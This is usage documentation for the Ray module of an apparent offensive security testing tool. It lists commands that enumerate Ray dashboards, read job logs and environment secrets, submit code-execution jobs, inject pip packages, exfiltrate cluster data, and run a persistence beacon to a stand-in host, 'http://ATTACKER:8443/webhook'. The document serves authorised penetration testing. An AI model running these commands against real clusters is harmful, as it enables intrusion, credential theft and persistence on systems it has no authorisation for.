# Ray

Enumerate and exploit Ray dashboard and jobs API.

## Overview

The `ray` module targets Ray cluster dashboards, covering metadata enumeration, job listing, log reads, artifact correlation, guarded proof-job submission, runtime environment validation, and a long-running beacon persistence proof. It follows a jobs-to-execution progression, tagging each finding with what actually `landed` on the cluster.

The jobs API client supports both JSON array responses (Ray 2.10+) and object-wrapped formats from older versions. The `jobs` command extracts `runtime_env` and `env_vars` from each job and emits critical-severity findings when credentials or secrets are found in job environment variables.

## Subcommands

### Read-Only (no `--force-exploit` required)

| Subcommand | Description |
|---|---|
| `enum` | Dashboard metadata and version |
| `jobs` | List visible jobs |
| `job-logs` | Read job detail and logs |
| `job-artifacts` | Extract artifact and log references from a job |

### Gated (requires `--force-exploit`)

| Subcommand | Description |
|---|---|
| `submit` | Submit a proof job through the jobs API |
| `runtime-env` | Validate runtime_env submission for a job |
| `pip-inject` | Prove pip injection via runtime_env (arbitrary package install on cluster workers) |
| `cluster-info` | Exfiltrate cluster resource and node information (IPs, CPU/GPU counts, alive status) |
| `beacon` | Submit a long-running worker beacon and confirm persistence via callback or Jobs API status |

## Flags

| Flag | Required | Description |
|---|---|---|
| `--target` | Yes | Ray dashboard URL (e.g., `http://127.0.0.1:8265`) |
| `--header` | No | Custom HTTP headers. Repeatable. |
| `--job-id` | For `job-logs`, `job-artifacts`, `runtime-env` | Job ID to inspect |
| `--entrypoint` | For `submit` | Job entrypoint command |
| `--runtime-env-json` | For `submit` | Runtime environment JSON |
| `--payload-preset` | For `submit` | Bounded payload preset name |
| `--callback-url` | For `beacon` | HTTP(S) callback URL reachable from the Ray worker |
| `--interval` | For `beacon` | Beacon interval in seconds |

## Payload Presets

The `submit` command supports pre-built bounded payload presets:

| Preset | Description |
|---|---|
| `env-disclosure` | Dump environment variables |
| `env-marked` | Write a marker to environment |
| `fs-survey` | Survey filesystem paths |
| `runtime-survey` | Survey runtime environment |
| `beacon` | Single marker payload for `submit`; use the `beacon` subcommand for a long-running callback loop |
| `python-print` | Simple Python print statement |

## Examples

```bash
# Enumerate dashboard
./aipostex ray --target http://127.0.0.1:8265 enum

# List jobs
./aipostex ray --target http://127.0.0.1:8265 jobs

# Read job logs
./aipostex ray --target http://127.0.0.1:8265 job-logs --job-id job-1

# Extract job artifacts
./aipostex ray --target http://127.0.0.1:8265 job-artifacts --job-id job-1

# Submit proof job (gated)
./aipostex ray --target http://127.0.0.1:8265 submit \
  --payload-preset env-disclosure --force-exploit

# Validate runtime-env (gated)
./aipostex ray --target http://127.0.0.1:8265 runtime-env \
  --job-id job-1 --force-exploit

# Prove pip injection via runtime_env (gated)
./aipostex ray --target http://127.0.0.1:8265 pip-inject --force-exploit

# Exfiltrate cluster resource info (gated)
./aipostex ray --target http://127.0.0.1:8265 cluster-info --force-exploit

# Submit a long-running beacon (gated)
./aipostex ray --target http://127.0.0.1:8265 beacon \
  --callback-url http://ATTACKER:8443/webhook --interval 30 --force-exploit
```

## What each `landed` level means here

The `landed` axis records what actually landed on the cluster. Ray tops out at `execution-confirmed` — a submitted job that ran and reported back from inside the cluster; it does not claim `takeover-capable`. A job the API accepted but whose execution isn't yet confirmed is only `influenced`, not a code-execution claim.

| `landed` | What produces it in ray |
|---|---|
| `reachable` | `enum` (dashboard responds, jobs API reachable); `jobs` (job list returned); `job-logs` when the fetched detail carries no readable path or execution marker |
| `influenced` | `submit`, `runtime-env`, `pip-inject`, `cluster-info`, `beacon` when the Job Submission API accepts the job but execution/persistence is not confirmed within the poll window (job accepted, output unread) |
| `read-confirmed` | `job-logs` / `job-artifacts` when the detail exposes readable filesystem paths or runtime/env disclosure |
| `execution-confirmed` | `submit` / `cluster-info` when the proof job runs and returns execution markers (uid/gid, `sys.path`, hostname, cluster resource JSON); `beacon` when an out-of-band callback arrives or the Jobs API reports the long-running beacon job `RUNNING` |

For `beacon`, an accepted submission alone is not persistence. The finding upgrades only when the tool observes a callback to the supplied `--callback-url` or the Ray Jobs API reports the beacon job running.

## Operator console

After the verbs have proven a stage, the [`request`](../cli/request.md) verb (`aipostex ray … request METHOD PATH`) lets you drive the Ray dashboard and Jobs API by hand — reusing the module's `--target`/`--header` — issuing any one-shot HTTP call and mining the response for loot. A bare request is honest and modest (Info severity, no impact claim). Ray has no interactive `shell`; use the gated `submit`/`pip-inject` verbs when you need confirmed execution.

## Workflow Progression

```
discover network (discovers Ray on :8265)
  → ray enum (dashboard metadata)
    → ray jobs (list visible jobs)
      → ray job-logs --job-id <id> (read logs)
      → ray job-artifacts --job-id <id> (correlate artifacts)
        → ray submit --payload-preset <preset> (proof of execution, gated)
        → ray runtime-env --job-id <id> (validate takeover, gated)
        → ray pip-inject (prove pip injection, gated)
        → ray cluster-info (exfiltrate cluster resources, gated)
        → ray beacon --callback-url <url> (long-running persistence proof, gated)
```
